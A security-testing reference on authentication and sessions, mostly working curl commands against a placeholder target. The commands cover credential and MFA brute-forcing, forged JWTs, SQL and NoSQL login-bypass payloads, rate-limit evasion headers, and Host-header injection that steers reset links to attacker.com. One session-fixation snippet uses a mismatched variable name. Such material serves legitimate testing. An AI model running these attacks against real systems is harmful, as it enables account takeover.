# Authentication and Session Management Testing Reference

Comprehensive testing methodology for authentication mechanisms, session management, and related security controls. All techniques are backend-agnostic and operate at the HTTP level.

---

## Credential Brute-Force Testing

### Common Password Lists

Test with these frequently used passwords against discovered usernames:

```
password
123456
admin
letmein
welcome
monkey
dragon
master
qwerty
login
password1
admin123
root
toor
changeme
test
guest
```

### Username Enumeration via Error Message Differences

```bash
# Test with a known-valid username (if available) vs invalid
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}' \
  "http://TARGET/api/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"nonexistentuser12345","password":"wrongpassword"}' \
  "http://TARGET/api/login"
```

**Detection indicators:**
- Different error messages: "Invalid password" vs "User not found" (username enumeration confirmed)
- Different HTTP status codes for valid vs invalid usernames
- Different response lengths or timing for valid vs invalid usernames
- Presence/absence of specific fields in response JSON

### Timing-Based Username Enumeration

```bash
# Measure response time for valid vs invalid usernames
for user in admin root test user nobody invalid12345; do
  echo -n "$user: "
  curl -s -o /dev/null -w "%{time_total}" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"wrong\"}" \
    "http://TARGET/api/login"
  echo
done
```

If valid usernames take longer (due to password hashing), timing-based enumeration is possible.

### Brute-Force Curl Example

```bash
# Test common passwords against a known username
for pass in password 123456 admin letmein welcome; do
  echo -n "Testing $pass: "
  curl -s -w "HTTP_CODE:%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}" \
    "http://TARGET/api/login"
  echo
done
```

---

## JWT (JSON Web Token) Attacks

### JWT Structure Analysis

```bash
# Decode a JWT (base64 decode header and payload)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
```

### Algorithm Confusion: "none" Algorithm

```bash
# Create a JWT with alg:none
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user":"admin","role":"admin"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}."

curl -s -H "Authorization: Bearer $TOKEN" "http://TARGET/api/admin"
```

### Algorithm Confusion: HS256 with Public Key

If the server uses RS256 but accepts HS256, sign with the public key:

```bash
# If you can obtain the server's public key
curl -s "http://TARGET/.well-known/jwks.json"
curl -s "http://TARGET/api/public-key"

# Then craft HS256 token signed with that public key
# Header: {"alg":"HS256","typ":"JWT"}
# The signature is HMAC-SHA256(header.payload, public_key_contents)
```

### JWT Token Manipulation

```bash
# Modify payload claims without re-signing (test if signature is verified)
# Change role from "user" to "admin", user ID, etc.
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin","iat":1700000000}' | base64 | tr -d '=' | tr '/+' '_-')
# Use original signature or empty signature
TOKEN="${HEADER}.${PAYLOAD}.invalidsignature"

curl -s -H "Authorization: Bearer $TOKEN" "http://TARGET/api/admin"
```

### JWT Expiry Testing

```bash
# Use an expired token and check if it is still accepted
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"user":"admin","exp":1000000000}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}.test"

curl -s -H "Authorization: Bearer $TOKEN" "http://TARGET/api/profile"
```

### JWT Detection Indicators

- Server accepts `alg:none` tokens (critical vulnerability)
- Server accepts tokens with invalid/empty signatures
- Server accepts expired tokens
- Server accepts HS256 when RS256 is expected
- Token payload contains sensitive data (passwords, internal IDs)

---

## Session Management Testing

### Session Fixation

```bash
# Get a session token before authentication
PRE_AUTH_COOKIE=$(curl -s -c - "http://TARGET/login" | grep -i 'session\|sid\|token')

# Authenticate with the pre-auth session
curl -s -b "session=$PRE_AUTH_SESSION" -X POST \
  -d "username=admin&password=password" \
  "http://TARGET/api/login"

# Check if the session ID changed after authentication
POST_AUTH_COOKIE=$(curl -s -c - -b "session=$PRE_AUTH_SESSION" "http://TARGET/api/profile")
```

If the session ID remains the same after authentication, session fixation is possible.

### Cookie Security Flags

```bash
# Check Set-Cookie headers for security flags
curl -s -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' \
  "http://TARGET/api/login" | grep -i 'set-cookie'
```

**Check for:**
- `Secure` flag: Cookie only sent over HTTPS (missing = Medium)
- `HttpOnly` flag: Cookie not accessible via JavaScript (missing = Medium)
- `SameSite` attribute: CSRF protection (missing or `None` = Medium)
- `Path` attribute: Cookie scope (overly broad = Low)
- `Expires`/`Max-Age`: Session duration (very long = Low)

### Session Invalidation on Logout

```bash
# Login and get session token
TOKEN=$(curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' \
  "http://TARGET/api/login" | jq -r '.token')

# Verify token works
curl -s -H "Authorization: Bearer $TOKEN" "http://TARGET/api/profile"

# Logout
curl -s -X POST -H "Authorization: Bearer $TOKEN" "http://TARGET/api/logout"

# Try using the same token after logout
curl -s -H "Authorization: Bearer $TOKEN" "http://TARGET/api/profile"
```

If the token still works after logout, session invalidation is broken.

---

## Authentication Bypass

### Default Credentials

Test common default credential pairs:

| Username | Password |
|---|---|
| admin | admin |
| admin | password |
| admin | admin123 |
| root | root |
| root | toor |
| test | test |
| user | user |
| guest | guest |
| administrator | administrator |
| demo | demo |

```bash
for cred in "admin:admin" "admin:password" "root:root" "test:test" "guest:guest"; do
  USER=$(echo $cred | cut -d: -f1)
  PASS=$(echo $cred | cut -d: -f2)
  echo -n "$USER:$PASS -> "
  curl -s -w "HTTP:%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
    "http://TARGET/api/login"
  echo
done
```

### SQL Injection in Login

```bash
# Classic auth bypass
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}' \
  "http://TARGET/api/login"

curl -s -X POST -d "username=admin' OR '1'='1' --&password=anything" \
  "http://TARGET/api/login"

# NoSQL auth bypass
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
  "http://TARGET/api/login"
```

### Parameter Manipulation

```bash
# Add role/admin parameters
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password","role":"admin"}' \
  "http://TARGET/api/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password","isAdmin":true}' \
  "http://TARGET/api/login"

# Test registration with elevated privileges
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"password","role":"admin"}' \
  "http://TARGET/api/register"
```

---

## Rate Limiting Detection

### Rapid Request Testing

```bash
# Send 20 rapid login attempts and observe response changes
for i in $(seq 1 20); do
  echo -n "Attempt $i: "
  curl -s -w "HTTP:%{http_code} TIME:%{time_total}" -o /dev/null \
    -X POST -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong'$i'"}' \
    "http://TARGET/api/login"
  echo
done
```

**Detection indicators for missing rate limiting:**
- All 20 requests return same status code (no 429 Too Many Requests)
- No `Retry-After` header in responses
- Response times remain consistent (no progressive delays)
- No account lockout after many failed attempts
- No CAPTCHA challenge triggered

### Rate Limit Bypass Attempts

```bash
# Try different headers to bypass IP-based rate limiting
curl -s -H "X-Forwarded-For: 1.2.3.4" -X POST \
  -d '{"username":"admin","password":"test"}' "http://TARGET/api/login"

curl -s -H "X-Real-IP: 5.6.7.8" -X POST \
  -d '{"username":"admin","password":"test"}' "http://TARGET/api/login"

curl -s -H "X-Originating-IP: 9.10.11.12" -X POST \
  -d '{"username":"admin","password":"test"}' "http://TARGET/api/login"
```

---

## Multi-Factor Authentication Bypass

### MFA Code Brute-Force

```bash
# If OTP is 4-6 digits and no rate limiting
for code in $(seq -w 0000 0010); do
  echo -n "Code $code: "
  curl -s -w "HTTP:%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"mfa_code\":\"$code\"}" \
    "http://TARGET/api/verify-mfa"
  echo
done
```

### MFA Skip Attempts

```bash
# Try accessing protected endpoints without completing MFA
curl -s -H "Authorization: Bearer $PRE_MFA_TOKEN" "http://TARGET/api/profile"

# Try removing MFA parameter
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' \
  "http://TARGET/api/login"
# If response contains a token without requiring MFA step, MFA is bypassable

# Try null/empty MFA code
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","mfa_code":null}' "http://TARGET/api/verify-mfa"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","mfa_code":""}' "http://TARGET/api/verify-mfa"
```

---

## Password Reset Flow Testing

### Predictable Reset Tokens

```bash
# Request multiple password resets and analyze tokens
for i in $(seq 1 5); do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@example.com"}' \
    "http://TARGET/api/forgot-password"
  sleep 1
done
# Compare tokens for sequential patterns, timestamp-based generation, or low entropy
```

### Reset Token via Response

```bash
# Check if reset token is returned in the HTTP response (should only be sent via email)
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com"}' \
  "http://TARGET/api/forgot-password"
```

If the response body contains the reset token, this is a vulnerability.

### Password Reset Without Old Password

```bash
# Try changing password without providing old password
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"newPassword":"hacked123"}' \
  "http://TARGET/api/change-password"
```

### Host Header Injection in Password Reset

```bash
# Inject attacker-controlled host in password reset email
curl -s -X POST -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' \
  "http://TARGET/api/forgot-password"

curl -s -X POST -H "X-Forwarded-Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' \
  "http://TARGET/api/forgot-password"
```

---

## General Authentication Testing Checklist

1. **Credential transport**: Are credentials sent over HTTPS? Check if HTTP redirects to HTTPS.
2. **Password policy**: Can weak passwords be set? Test registration with `a`, `123`, `password`.
3. **Account lockout**: Does the account lock after repeated failures? Is there a lockout bypass?
4. **Remember me**: Is the "remember me" token predictable or long-lived?
5. **Concurrent sessions**: Can a user have multiple active sessions? Does login invalidate others?
6. **Credential storage**: Are passwords returned in any API response (profile, admin endpoints)?
7. **Token in URL**: Are session tokens or JWTs passed in URL parameters (visible in logs)?
